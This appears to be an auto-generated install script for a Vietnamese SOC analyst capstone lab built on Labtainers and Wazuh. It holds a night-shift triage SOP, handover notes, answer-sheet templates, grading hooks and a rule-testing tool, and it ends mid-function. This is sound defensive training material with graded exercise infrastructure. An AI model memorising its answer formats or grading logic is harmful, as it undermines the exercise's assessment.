#!/bin/bash
# ============================================================================
# soc-shift-capstone - Bai 18: Ca truc mo phong (capstone) - P0-P7
# Chay tren VM:  bash install-soc-shift-capstone.sh ; roi rebuild soc-shift-capstone
# (File sinh tu dong boi labs/_shared/make-install.py - sua ma nguon trong labs/soc-shift-capstone/ roi sinh lai.)
# ============================================================================
set -e
if [ -z "$LABTAINER_DIR" ]; then echo "LOI: chua co bien LABTAINER_DIR"; exit 1; fi
LAB=$LABTAINER_DIR/labs/soc-shift-capstone
echo ">> Tao thu muc lab tai $LAB"; rm -rf "$LAB"; mkdir -p "$LAB"
mkdir -p "$LAB/config"
cat > "$LAB/config/about.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
SOC Lab - Bai 18: Ca truc mo phong (capstone).
Ca dem 90 phut mot minh: hang doi ticket den theo thoi gian thuc, mot chien dich tan cong web-shop
rai qua nhieu ticket, mot yeu cau luat khan cua IR va mot bao canh bao che giau tan cong.
Cham theo chinh xac + thoi gian + chat luong luat, ket thuc bang ban giao ca.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/config"
cat > "$LAB/config/parameter.config" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# parameter.config - Bai 18: RONG CO CHU DICH.
# Ca nhan hoa do siem tu sinh luc boot dau tien (seed ngau nhien, luu /root/.bai18/seed):
# boot-hook Labtainers (parameter/fixlocal) bi bo qua tren anh chung soc-wazuh nen RAND_REPLACE khong toi siem.
# Tap phat trien cua R-A/R-B duoc siem sinh tu CUNG seed va giao cho defender qua shiftd khi yeu cau xuat hien.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/config"
cat > "$LAB/config/start.config" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# start.config - Lab soc-shift-capstone (Bai 18: Ca truc mo phong - capstone)
# 2 container: siem (AN, TERMINALS 0: Wazuh anh chung + lich ca + dap an) va defender (lam bai, noi cham).
# Ca truc 90' tinh tu T0 (siem quyet dinh, phat qua shiftd :8088). Xem docs/bai18-trien-khai.md.

GLOBAL_SETTINGS
	LAB_MASTER_SEED soc-shift-capstone_student_master_seed
	GRADE_CONTAINER defender

NETWORK  SOC_NET
	MASK 172.20.0.0/24
	GATEWAY 172.20.0.101

# --- SIEM: Wazuh (anh chung soc-wazuh). AN: lich phat su kien, tap kiem tra an, dap an ---
CONTAINER siem
	USER ubuntu
	SOC_NET 172.20.0.20
	ADD-HOST defender:172.20.0.30
	TERMINALS 0

# --- DEFENDER: tram analyst ca dem - Firefox (dashboard), phieu ca truc, kiem-thu-luat / thu-dong / goi-y ---
CONTAINER defender
	USER ubuntu
	SOC_NET 172.20.0.30
	ADD-HOST siem:172.20.0.20
	X11 YES
	TERMINALS 1
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/SOP-ca-truc.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
SOP-T1-04  QUY TRÌNH CA TRỰC ĐÊM — SOC CÔNG TY X  (Tier 1, một người trực)
(dựa trên SOP-T1-03 Triage cảnh báo; bổ sung mục 2, 9, 11, 12 cho ca trực)

0. NGUỒN DỮ LIỆU
   - Mọi máy gửi log về SIEM qua syslog tập trung → trên dashboard trường agent luôn là "siem".
     MÁY của một sự kiện = trường predecoder.hostname.
   - Hàng đợi ticket: Discover, truy vấn  data.ticket:*  (bật auto-refresh 30s suốt ca).
   - Ngữ cảnh doanh nghiệp: index pattern ctx-*  (tài sản, dịch vụ, phiếu thay đổi, nhân sự).

1. MỤC TIÊU THỜI GIAN
   - Ticket P1 mới: XÁC NHẬN (ghi verdict + ghi chú leo thang) trong ≤ 10 phút kể từ khi xuất hiện.
   - Bão cảnh báo: KHOANH VÙNG trong ≤ 20 phút kể từ khi bắt đầu.
   - Yêu cầu luật khẩn của IR: triển khai bản "đủ tốt" trong ≤ 20 phút kể từ khi nhận.
   - Ticket thường: mục tiêu ≤ 5 phút/ticket.

2. THỨ TỰ ƯU TIÊN GIỮA CÁC LOẠI VIỆC (cao → thấp)
   (1) Ticket P1 mới.
   (2) Bão cảnh báo. Bão vừa làm ngập dashboard, vừa có thể CHE một tấn công thật.
   (3) Yêu cầu luật khẩn của IR.
   (4) Ticket thường, theo thứ tự thời gian xuất hiện (cũ trước).
   Đang làm việc (3)/(4) mà có việc (1)/(2) mới → DỪNG, chuyển sang việc mới.

3. BẮT BUỘC PIVOT (ít nhất 2 nguồn cho mỗi ticket)
   a. LOG THÔ: cùng máy + cùng IP/user/tiến trình, cửa sổ ±30 phút quanh alert.
      Tìm BƯỚC TIẾP THEO: đăng nhập thành công, mã thực thi, dữ liệu rời đi.
      (Tên người dùng của sshd nằm ở trường data.dstuser.)
   b. NGỮ CẢNH (ctx-*): tài sản (mức quan trọng), dịch vụ đã duyệt (SVC),
      phiếu thay đổi (CHG), nhân sự (nghỉ phép LV, trực on-call OC).

4. QUY TẮC KHỚP NGỮ CẢNH
   Một bản ghi CHỈ được dùng để đóng ticket khi khớp ĐỦ các điều kiện:
     (1) đúng MÁY (trường host)
     (2) đúng CHỦ THỂ (IP nguồn / user / tiến trình / domain / đường dẫn)
     (3) trạng thái còn hiệu lực (CHG/OC: approved ; SVC: approved, không 'retired')
     (4) CHỈ với CHG và OC (bản ghi có thời hạn): giờ alert nằm TRONG khung start–end.
         SVC là danh mục thường trực, không có khung giờ.
   ⇒ CHG, OC: 4 điều kiện.   SVC: 3 điều kiện (1)–(3).
   Thiếu 1 điều kiện = coi như KHÔNG có ngữ cảnh.
   Nhân viên đang NGHỈ PHÉP (LV) mà đăng nhập = không có căn cứ hợp lệ.

5. ĐỊNH NGHĨA VERDICT VÀ HÀNH ĐỘNG
   "Hoạt động luật nhắm tới" = LOẠI hành vi nguy hiểm ghi trong TÊN luật
   (vd "nghi tuồn dữ liệu qua DNS"), KHÔNG phải đặc trưng kỹ thuật luật đo (vd "subdomain dài").
   V=1 TP  : hoạt động luật nhắm tới CÓ THẬT và KHÔNG được phép.          → LEO THANG.
   V=2 BTP : hoạt động luật nhắm tới CÓ THẬT nhưng ĐƯỢC PHÉP: có bản ghi
             CHG/OC khớp đủ (mục 4).                                        → ĐÓNG, ghi số CHG/OC.
   V=3 FP  : hoạt động luật nhắm tới KHÔNG xảy ra — luật nổ trên một hoạt động
             KHÁC LOẠI (phần mềm hợp lệ có đặc trưng giống). Giải thích bằng
             một SVC đã duyệt.                                              → ĐÓNG, ghi số SVC.
   Chưa đủ căn cứ để đóng → coi là TP và leo thang. Bỏ sót TP là lỗi NẶNG nhất.

6. MA TRẬN ƯU TIÊN (chỉ áp dụng cho TP; BTP/FP luôn P=4)
   Giai đoạn:  A = đang tác động (thực thi mã, dữ liệu đang rời đi, C2 đang hoạt động)
               B = đã truy cập thành công, chưa thấy tác động
               C = chỉ thử, chưa thành công
   Mức tài sản lấy từ ctx-assets (criticality) của MÁY GHI TRONG TICKET.
                     Cao    TB    Thấp
       Giai đoạn A   P1     P1    P2
       Giai đoạn B   P1     P2    P3
       Giai đoạn C   P3     P3    P4
   KHÔNG xếp ưu tiên theo rule.level.

7. BẰNG CHỨNG BẮT BUỘC (cột E trong phiếu) — một số nguyên:
   TP  : IOC chính
           - tài khoản bị chiếm / bị lạm dụng → số id (emp4521 → 4521)
           - IP kẻ tấn công / IP C2 → octet cuối
           - máy nội bộ bị nhiễm (khi IOC là máy nguồn, vd tuồn dữ liệu) → octet cuối IP máy đó
   BTP : số bản ghi phê duyệt khớp đủ (CHG-7731 → 7731 ; OC-0412 → 412)
   FP  : số SVC giải thích hành vi (SVC-207 → 207)

8. PHIẾU TRIAGE (~/triage.txt) — mỗi ticket 1 dòng:
   INC-xxx=<V>,<P>,<E>
   Ghi muộn vẫn hơn bỏ trống: ticket không có dòng = chưa xử lý.

9. GOM SỰ CỐ (~/su-co.txt)
   Nhiều ticket thuộc cùng MỘT chuỗi tấn công → ghi thành MỘT sự cố (SC1, SC2, ...).
   Ticket giống một bước của chuỗi nhưng ở MÁY KHÁC, không có liên hệ → KHÔNG gom.
   Mỗi sự cố chỉ cần MỘT ghi chú leo thang, cập nhật khi có ticket mới của chuỗi.

10. GHI CHÚ LEO THANG (~/leo-thang/SC<n>.txt) — bắt buộc cho mỗi sự cố có P1.
    Điền đủ các trường KEY=giá trị trong khung. Cập nhật (không tạo file mới) khi chuỗi có bước mới.
    - MITRE ghi SỐ (T1071 → 1071), nhiều kỹ thuật cách nhau dấu phẩy.
    - LIEN_QUAN: số ticket KHÁC thuộc CÙNG sự cố.
    - DE_XUAT: chọn MỌI mã phù hợp, cách nhau dấu phẩy. Chọn sai mã có hại
      bị tính là lỗi, kể cả khi chọn đủ mã đúng.
        1 = Cô lập mạng máy bị ảnh hưởng (giữ máy chạy)
        2 = Giữ nguyên bộ nhớ/tiến trình để IR thu thập (KHÔNG tắt, KHÔNG kill)
        3 = Chặn IP C2 / IP kẻ tấn công tại biên
        4 = Tắt nguồn máy ngay
        5 = Vô hiệu hóa / đặt lại mật khẩu tài khoản liên quan
        6 = Xóa ngay file độc trên máy
        7 = Đóng ticket vì đã chặn được IP
        8 = Báo chủ sở hữu tài sản

11. THAY ĐỔI LUẬT TRONG CA (~/luat/local_rules.xml, nạp bằng: kiem-thu-luat)
    - Mọi luật cảnh báo: level ≥ 10, có <mitre>, nằm trong dải ID được giao.
    - CẤM tắt luật hoặc hạ luật xuống dưới mức cảnh báo để dập bão.
    - Ngoại lệ = luật con level 0, dựa trên TRƯỜNG + DANH MỤC CÓ CĂN CỨ (phiếu thay đổi,
      dịch vụ đã duyệt). Ngoại lệ càng hẹp càng tốt: cùng lúc đúng máy nguồn VÀ đúng hành vi.
    - Trước khi nạp: kiểm bằng thu-dong và tập phát triển kèm yêu cầu.

12. BÀN GIAO CA (~/ban-giao.txt) — điền đủ các trường, viết cho người KHÔNG ở trong ca:
    sự cố còn mở, luật đã đổi, ticket chưa xử lý, rủi ro ca sau phải theo dõi ngay,
    việc cần trưởng ca / IR quyết định.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/ban-giao-ca-truoc.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
BÀN GIAO CA CHIỀU → CA ĐÊM   (người bàn giao: Trưởng ca chiều)

1. Hàng đợi còn tồn
   - Còn 1 ticket từ đầu giờ chiều chưa kịp xem (số INC nhỏ nhất trong hàng đợi). Cũ nhưng vẫn phải xử lý.

2. Đang theo dõi
   - Chiều nay web-shop bị vài IP ngoài dò SQLi (payload bị chặn, trả 403/500). Chưa thấy gì
     lọt qua. Hoạt động dò thám buổi chiều KHÔNG tính là sự cố của ca đêm, nhưng để ý web-shop.
   - Luật webshell hiện tại của web-shop chỉ bắt tham số "cmd=". Đã báo team Detection, chưa sửa.

3. Thay đổi đã lên lịch tối nay
   - DevOps triển khai agent sao lưu mới tới toàn bộ máy chủ (xem phiếu thay đổi trong ctx-changes).
     Lần trước triển khai kiểu này dashboard rất ồn. Nhớ: ồn không có nghĩa là được tắt luật.
   - Vài nhân viên đang nghỉ phép / trực on-call (ctx-hr) — tra trước khi đóng ticket đăng nhập.

4. Liên hệ
   - IR trực đêm nhận ghi chú leo thang qua ~/leo-thang/. IR có thể gửi yêu cầu luật khẩn vào ~/yeu-cau/.
   - Trưởng ca đêm đọc ~/ban-giao.txt lúc giao ca sáng.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/ban-giao.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# BAN GIAO CA (SOP muc 12) - viet SAU khi het ca, cho nguoi KHONG o trong ca
SU_CO_DANG_MO=        # so luong su co chua dong
SC_CHINH=             # ten su co chinh (vd SC1) va may trung tam
LUAT_DA_THAY_DOI=     # dai ID cac luat ban da them/sua trong ca
TICKET_CHUA_XU_LY=    # cac ticket chua co dong trong triage.txt (neu co)
RUI_RO_CHO_CA_SAU=    # 2-3 cau: dieu ca sau phai theo doi ngay
VIEC_CAN_QUYET=       # 1-2 cau: quyet dinh can truong ca / IR dua ra
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/ke-hoach.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# KE HOACH CA (viet TRUOC ca, khong cham): khi 2 viec den cung luc, ban lam viec nao truoc va vi sao?
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/khao-sat.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# "Toi tu tin xu ly mot ca truc co nhieu loai viec den cung luc ma khong bo sot su co." (1 = khong tu tin ... 5 = rat tu tin)
TRUOC=
SAU=
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/phan-tu.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# PHAN TU (sau ca): so ke-hoach.txt voi thu tu ban THUC SU da lam. Luc nao ban chon sai viec? Lan sau ban lam gi khac?
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/su-co.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# GOM SU CO (SOP muc 9) - cac ticket cung MOT chuoi tan cong = MOT su co
SC1=                # cac ticket cung chuoi, vd INC-201,INC-207
SC1_HOST=           # may trung tam cua su co
SC1_GIAI_DOAN=      # so giai doan cua chuoi XAY RA TRONG CA (tinh ca giai doan KHONG co ticket;
                    # khong tinh hoat dong truoc ca, vd do tham luc chieu)
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender"
cat > "$LAB/defender/triage.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
# PHIEU TRIAGE - moi ticket 1 dong (SOP muc 8):  INC-xxx=V,P,E
#   V: 1=TP 2=BTP 3=FP    P: 1..4 (BTP/FP luon 4)    E: so nguyen (SOP muc 7)
# Ghi lai dong de sua: dong CUOI CUNG cua moi ticket duoc tinh. Het ca -> phieu DONG BANG.
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/fixlocal.sh" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/bin/bash
# fixlocal defender (Bai 18) - chay bang user (SV khong co root; moi thu can root cai luc BUILD qua _system/).
# Chi them hook nhac gio vao .bashrc + UTF-8 de doc SOP co dau.
grep -q CA_TRUC_NHAC ~/.bashrc 2>/dev/null || cat >> ~/.bashrc <<'RC'
# --- Bai 18: nhac cua ca truc (watcher ghi ~/.ca-truc-nhac) --- CA_TRUC_NHAC
export LANG=C.UTF-8 LC_ALL=C.UTF-8
_ca_truc_nhac() {
  local f=~/.ca-truc-nhac s=~/.ca-truc-nhac.seen n m
  [ -f "$f" ] || return
  n=$(wc -l < "$f"); m=$(cat "$s" 2>/dev/null || echo 0)
  if [ "$n" -gt "$m" ]; then tail -n $((n - m)) "$f" | sed 's/^/\x1b[1;33m>> /;s/$/\x1b[0m/'; echo "$n" > "$s"; fi
}
PROMPT_COMMAND="_ca_truc_nhac${PROMPT_COMMAND:+; $PROMPT_COMMAND}"
RC
exit 0
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/prestop" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/bin/bash
# prestop defender (Bai 18): 'sudo -n /usr/local/sbin/bai18-thu-thap' (root) in phieu DA DONG BANG + nhat ky
# watcher (moc lan dau ghi tung INC), nhat ky kiem-thu-luat / goi-y, khao sat.
# Labtainers LOI grader neu result thieu -> thu-thap loi/qua gio thi in gia tri giu cho (999998, moi goal N).
trap "echo Timed out; exit" SIGTERM
ls -t /home/ubuntu/.local/result/prestop.stdout.* 2>/dev/null | tail -n +2 | xargs -r rm -f 2>/dev/null
echo "DEFENDER18_MARKER"
OUT=$(timeout 20 sudo -n /usr/local/sbin/bai18-thu-thap 2>/dev/null)
if echo "$OUT" | grep -q "^ANS_N="; then
  echo "$OUT"
else
  X=999998
  echo "PRESTOP_FALLBACK"
  for k in $(seq 1 13); do echo "INC_$k=$X ANS_V_$k=$X ANS_P_$k=$X ANS_E_$k=$X"; done
  echo "ANS_SC_TK_C=0 ANS_SC_HOST_C=0 ANS_SC_GIAI_DOAN=$X"
  echo "LT_TICKET=$X LT_HOST_C=0 LT_ASSET_LEVEL=$X LT_STAGE=$X LT_MITRE_C=0 LT_IOC_C2=$X LT_DE_XUAT_C=0"
fi
exit 0
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_bin"
cat > "$LAB/defender/_bin/student_startup.sh" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/bin/bash
# Chay trong terminal ao cua defender. Mo Wazuh dashboard trong Firefox.
# Chi chay duoi quyen user thuong (khong phai root).
if ! id | grep -q 'uid=0'; then
  ( firefox https://172.20.0.20 >/dev/null 2>&1 & )
fi
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system"
cat > "$LAB/defender/_system/README.txt" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
Cay nay duoc Labtainers giai nen vao / cua defender LUC BUILD (quyen root) -> cho cong cu + watcher (D4: SV khong co root).
P4: usr/local/bin/{kiem-thu-luat,thu-dong,goi-y,trang-thai}, usr/local/sbin/{bai18-watcher,bai18-thu-thap}, etc/systemd/system/bai18-watcher.service
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/etc/soc-tools"
cat > "$LAB/defender/_system/etc/soc-tools/lab.json" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
{
  "rules_file": "luat/local_rules.xml",
  "lists_dir": "luat/lists",
  "lists": ["sao-luu-hosts", "sao-luu-ports"],
  "dev_set": "yeu-cau/R-A/dev.jsonl",
  "dev_sets": ["yeu-cau/R-A/dev.jsonl", "yeu-cau/R-B/dev.jsonl"],
  "ranges": "ra=100330-100339,rb=100340-100349",
  "goiy": "bai18"
}
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/etc/systemd/system"
cat > "$LAB/defender/_system/etc/systemd/system/bai18-khoa-quyen.service" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
[Unit]
Description=Bai 18 - go quyen root cua SV tren defender sau khi Labtainers khoi tao xong
After=multi-user.target

[Service]
Type=oneshot
RemainAfterExit=yes
TimeoutStartSec=2000
ExecStart=/usr/local/sbin/bai18-khoa-quyen

[Install]
WantedBy=multi-user.target
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/etc/systemd/system"
cat > "$LAB/defender/_system/etc/systemd/system/bai18-watcher.service" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
[Unit]
Description=Bai 18 - watcher ca truc (moc thoi gian, yeu cau, dong bang phieu)
After=multi-user.target

[Service]
ExecStart=/usr/bin/python3 /usr/local/sbin/bai18-watcher
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/bin"
cat > "$LAB/defender/_system/usr/local/bin/goi-y" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# goi-y <pha> <cap>   - in goi y cap 2/3 cua bai dang lam va GHI NHAT KY (~/.goi-y.log).
# goi-y               - liet ke cac goi y co san.
# Ha tang DUNG CHUNG (Bai 14-18). Goi y cap 1 nam trong read_first.txt.
#
# Noi dung luu o /usr/local/share/goi-y/<bai>.dat (zlib + base64 - chi de tranh "lo mat doc",
# khong phai bao mat). <bai> lay tu "goiy" trong /etc/soc-tools/lab.json.
# Tac gia: tao .dat tu file nguon bang:  goi-y --encode bai17.txt bai17.dat
#   File nguon: cac khoi bat dau bang dong "[<pha>.<cap>]" (vd [2.3]), ASCII.
# ============================================================================
import base64, json, os, pwd, sys, time, zlib

CONF = "/etc/soc-tools/lab.json"
DATA_DIR = "/usr/local/share/goi-y"


def home():
    u = os.environ.get("SUDO_USER")
    return pwd.getpwnam(u).pw_dir if u else os.path.expanduser("~")


def parse(text):
    blocks, key, buf = {}, None, []
    for ln in text.splitlines():
        s = ln.strip()
        if s.startswith("[") and s.endswith("]") and "." in s:
            if key:
                blocks[key] = "\n".join(buf).strip()
            key, buf = s[1:-1], []
        elif key:
            buf.append(ln)
    if key:
        blocks[key] = "\n".join(buf).strip()
    return blocks


def load():
    bai = json.load(open(CONF)).get("goiy", "bai")
    raw = open(os.path.join(DATA_DIR, bai + ".dat"), "rb").read()
    return bai, parse(zlib.decompress(base64.b64decode(raw)).decode("utf-8"))


def main():
    a = sys.argv[1:]
    if len(a) == 3 and a[0] == "--encode":
        src = open(a[1], encoding="utf-8").read()
        open(a[2], "wb").write(base64.b64encode(zlib.compress(src.encode("utf-8"), 9)))
        print("Da ghi %s (%d khoi)" % (a[2], len(parse(src))))
        return
    try:
        bai, blocks = load()
    except Exception as e:
        print("Khong doc duoc du lieu goi y: %s" % e)
        sys.exit(1)
    if len(a) != 2:
        print("Dung: goi-y <pha> <cap>   (cap 2 = chi cho, cap 3 = gan nhu loi giai)")
        print("Goi y cap 1 nam trong read_first.txt. Cac goi y co san:")
        for k in sorted(blocks):
            print("  goi-y %s %s" % tuple(k.split(".", 1)))
        return
    key = "%s.%s" % (a[0], a[1])
    if a[1] == "1":
        print("Goi y cap 1 nam trong read_first.txt.")
        return
    if key not in blocks:
        print("Khong co goi y '%s'. Chay 'goi-y' de xem danh sach." % key)
        sys.exit(1)
    try:
        with open(os.path.join(home(), ".goi-y.log"), "a") as f:
            f.write("%s %s pha=%s cap=%s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), bai, a[0], a[1]))
    except OSError:
        pass
    print(blocks[key])


if __name__ == "__main__":
    main()
__EOF_LAB_SOC_SHIFT_CAPSTONE__
mkdir -p "$LAB/defender/_system/usr/local/bin"
cat > "$LAB/defender/_system/usr/local/bin/kiem-thu-luat" <<'__EOF_LAB_SOC_SHIFT_CAPSTONE__'
#!/usr/bin/env python3
# ============================================================================
# kiem-thu-luat - kiem cu phap, nap luat + CDB list cua nguoi hoc len Wazuh, khoi dong lai
# manager, roi phat lai TAP PHAT TRIEN va in TP/FP/FN, precision, recall tung ho.
# Ha tang DUNG CHUNG (Bai 16, 17, 18). Cau hinh rieng tung bai: /etc/soc-tools/lab.json
#   {
#     "rules_file": "luat/local_rules.xml",        (tuong doi voi HOME nguoi hoc)
#     "lists_dir":  "luat/lists",
#     "lists":      ["gtfo-shell", "sudo-approved", "admin-hosts"],
#     "dev_set":    "dev/dev.jsonl",               (hoac "dev_sets": [..] - Bai 18: chi file DA co moi phat lai)
#     "ranges":     "l1=100270-100279,l2=100280-100289,l3=100290-100299"
#   }
# An toan: luat loi -> KHOI PHUC ban dang chay truoc do, manager khong bi sap.
# ============================================================================
import hashlib, json, os, pwd, sys, time
import xml.etree.ElementTree as ET

HERE = os.path.dirname(os.path.realpath(__file__))
for p in (HERE, "/usr/local/lib/soc-tools"):
    if os.path.isfile(os.path.join(p, "wzapi.py")):
        sys.path.insert(0, p)
        break
from wzapi import Wazuh, WazuhError
import replay

CONF = "/etc/soc-tools/lab.json"


def user_home():
    u = os.environ.get("SUDO_USER")
    if u:
        return pwd.getpwnam(u).pw_dir
    return os.path.expanduser("~")


def die(msg, code=1):
    print("LOI: " + msg)
    sys.exit(code)


BAD_TAGS = {
    "srcuser": "khong co the nay; so ten tren dong log bang <regex type=\"pcre2\">",
    "dstuser": "dung <user>",
    "different_dstuser": "dung <different_user />",
    "same_dstuser": "khong co the nay tren Wazuh 4.14",
}
STATIC_FIELDS = {
    "srcuser": "So ten tren dong log bang <regex type=\"pcre2\">.",
    "dstuser": "Dung <user>.",
    "srcip": "Dung <srcip> hoac <list field=\"srcip\" ...>.",
    "dstip": "Dung <dstip>.",
    "user": "Dung <user>.",
    "url": "Dung <url> (co the type=\"pcre2\").",
    "dstport": "Dung <dstport> hoac <list field=\"dstport\" ...>.",
    "srcport": "Dung <srcport>.",
    "id": "Dung <id>.",
    "protocol": "Dung <protocol>.",
    "action": "Dung <action>.",
}
# Luat nen level 0 (Wazuh KHONG dem tan suat tren luat level 0 - spike Bai 18)
LEVEL0_BASES = {"4100", "31100", "12100", "5700", "5500", "530"}


def check_rules_xml(text, ranges):
    """Kiem cu phap XML + moi rule id phai nam trong dai duoc giao. Tra ve danh sach loi."""
    errs = []
    try:
        root = ET.fromstring("<root>" + text + "</root>")
    except ET.ParseError as e:
        return ["Cu phap XML sai: %s" % e]
    allowed = list(ranges.values())
    if not list(root.iter("rule")):
        return ["Chua co luat nao trong file (Wazuh tu choi <group> rong)"]
    # Loi da gap tren Wazuh 4.14 that (API bao chung chung "1113 XML syntax error"):
    for el in root.iter():
        if el.tag in BAD_TAGS:
            errs.append("The <%s> KHONG hop le trong luat Wazuh: %s" % (el.tag, BAD_TAGS[el.tag]))
        if el.tag == "field" and el.get("name") in STATIC_FIELDS:
            errs.append('<field name="%s"> KHONG dung duoc: %s la truong TINH. %s'
                        % (el.get("name"), el.get("name"), STATIC_FIELDS[el.get("name")]))
    for el in root.iter("different_field"):
        if (el.text or "").strip() in STATIC_FIELDS:
            errs.append("CANH BAO: <different_field>%s</different_field> hop le cu phap nhung KHONG co tac dung "
                        "voi truong tinh -> dung <different_%s />" % (el.text.strip(), el.text.strip()))
    for rule in root.iter("rule"):
        ms = rule.find("if_matched_sid")
        if rule.get("frequency") and ms is not None and set((ms.text or "").replace(" ", "").split(",")) & LEVEL0_BASES:
            errs.append("CANH BAO: luat %s dem tan suat tren luat nen level 0 (%s) -> se KHONG BAO GIO no; "
                        "dem tren mot luat trung gian level >= 1" % (rule.get("id"), ms.text.strip()))
        rid = rule.get("id", "")
        if not rid.isdigit():
            errs.append("Luat thieu id hoac id khong phai so: %r" % rid)
            continue
        n = int(rid)
        if not any(lo <= n <= hi for lo, hi in allowed):
            errs.append("Luat id=%d nam NGOAI dai ID duoc giao" % n)
        lvl = rule.get("level", "")
        if lvl.isdigit() and int(lvl) >= 10 and rule.find("mitre") is None:
            errs.append("Luat id=%d level %s thieu <mitre>" % (n, lvl))
    return errs


def main():
    if not os.path.isfile(CONF):
        die("khong thay %s (lab chua cai cong cu?)" % CONF)
    cfg = json.load(open(CONF))
    home = user_home()
    rules_path = os.path.join(home, cfg["rules_file"])
    lists_dir = os.path.join(home, cfg["lists_dir"])
    dev_sets = [os.path.join(home, p) for p in (cfg.get("dev_sets") or [cfg["dev_set"]])]
    dev_sets = [p for p in dev_sets if os.path.isfile(p)]
    dev = []
    for p in dev_sets:
        dev += replay.load_set(p)
    ranges = replay.parse_ranges(cfg["ranges"])

    print("== 1) Kiem tra cuc bo: %s" % rules_path)
    if not os.path.isfile(rules_path):
        die("khong thay file luat %s" % rules_path)
    text = open(rules_path, encoding="utf-8").read()
    errs = check_rules_xml(text, ranges)
    hard = [e for e in errs if "thieu <mitre>" not in e and not e.startswith("CANH BAO")]
    for e in errs:
        print("   - " + e)
    if hard:
        die("sua cac loi tren roi chay lai (CHUA nap gi len Wazuh).")

    # Quy uoc phat lai: luat tan suat phai co timeframe >= window_s cua kich ban trong ho do
    # (bo phat lai gui ca cua so gan nhu cung luc nen tap kiem tra KHONG do duoc dieu nay).
    try:
        wins = {}
        for sc in dev:
            wins[sc["family"]] = max(wins.get(sc["family"], 0), int(sc.get("window_s", 0)))
        root = ET.fromstring("<root>" + text + "</root>")
        for rule in root.iter("rule"):
            rid, tf = rule.get("id", "0"), rule.get("timeframe")
            if not (rid.isdigit() and rule.get("frequency") and tf and tf.isdigit()):
                continue
            for fam, (lo, hi) in ranges.items():
                if lo <= int(rid) <= hi and int(tf) < wins.get(fam, 0):
                    print("   - CANH BAO: luat %s (ho %s) timeframe=%s < cua so kich ban %ss -> luat se bo lo "
                          "hanh vi keo dai trong thuc te (va bi tru o cham diem)." % (rid, fam, tf, wins[fam]))
    except Exception:  # noqa: BLE001
        pass

    lists = {}
    for name in cfg.get("lists", []):
        p = os.path.join(lists_dir, name)
        lists[name] = open(p, encoding="utf-8").read() if os.path.isfile(p) else ""
        for i, ln in enumerate(lists[name].splitlines(), 1):
            if ln.strip() and ":" not in ln:
                die("CDB list %s dong %d sai dinh dang (can 'khoa:' hoac 'khoa:gia_tri'): %r" % (name, i, ln))

    api = Wazuh()
    try:
        api.login()
    except WazuhError as e:
        die(str(e) + "\n   (Wazuh co the dang khoi dong - doi 1-2 phut roi chay lai)")

    print("== 2) Sao luu luat dang chay")
    try:
        backup_rules = api.get_rule_file("local_rules.xml")
    except WazuhError:
        backup_rules = None

    print("== 3) Nap luat + %d CDB list" % len(lists))
    try:
        api.put_rule_file("local_rules.xml", text)
        for name, content in lists.items():
            api.put_list_file(name, content if content.strip() else "lab-placeholder:\n")
    except WazuhError as e:
        if backup_rules is not None:
            try:
                api.put_rule_file("local_rules.xml", backup_rules)
            except WazuhError:
                pass
        die("Wazuh tu choi file: %s" % e)
    # doc lai de chac file tren siem DUNG la file vua gui
    try:
        now = api.get_rule_file("local_rules.xml")
    except WazuhError:
        now = None
    if now is not None and now.strip() != text.strip():
        die("File luat tren siem KHAC file vua gui (co the API khong ghi duoc). Chay lai; neu van loi bao giang vien.")

    try:
        ok, msg = api.validate()
    except WazuhError as e:
        # khong kiem duoc -> KHONG de luat chua kiem tren dia (lan restart sau se nap no)
